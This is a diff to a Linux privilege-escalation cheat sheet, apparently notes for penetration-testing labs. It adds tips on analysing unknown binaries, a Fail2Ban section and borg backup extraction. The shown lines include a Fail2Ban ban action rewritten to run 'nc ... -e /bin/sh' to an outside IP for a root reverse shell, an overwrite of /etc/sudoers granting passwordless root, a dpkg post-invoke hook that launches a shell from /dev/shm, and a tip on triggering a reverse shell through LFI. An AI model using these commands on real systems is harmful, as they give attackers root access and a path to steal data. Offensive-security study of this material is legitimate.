@@ -376,6 +376,17 @@ sudo -i # if you can run this, you'll be root
 echo “dademola ALL=(root) NOPASSWD: ALL” > /etc/sudoers # another reliable way to get sudo
 ```
 
+### Whenever You find an Unknown Binary 
+
+- Strings to try and understand.
+- Run with pspy and observe behavior.
+- Run with Wireshark open to see was good.
+- Identity and DLLS that you find in strings, see if they're missing or anything is modifiable.
+
+```bash
+strings elfBinary
+```
+
 ### Inspecting Service Footprints
 
 System daemons are Linux services that are spawned at boot time to perform specific operations without any need for user interaction. Linux servers are often configured to host numerous daemons, like SSH, web servers, and databases, to mention a few.
@@ -651,6 +662,22 @@ echo 'Dpkg::Post-Invoke {"/dev/shm/shell";};' >> 99-post-upgrade
 ```
 
 #### If you have LFI and youre on the box, you can place revshell in file and trigger from web to get shell as that user
+
+#### Fail2Ban
+
+If you're a part of the fail2ban group, check out the main configuration file which can be found at /etc/fail2ban/jail.conf. Look for how to get banned, as well as what the ban action is. If you can modify the ban file or action directly, you can make it give you a reverse shell onto the box as root.
+
+```bash
+#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+actionban = /usr/bin/nc 192.168.45.163 873 -e /bin/sh
+```
+
+#### Borg
+
+```bash
+sudo borg list /opt/borgbackup/
+sudo borg extract /opt/borgbackup/::home --stdout
+```
 
 #### Tar wildcard
 
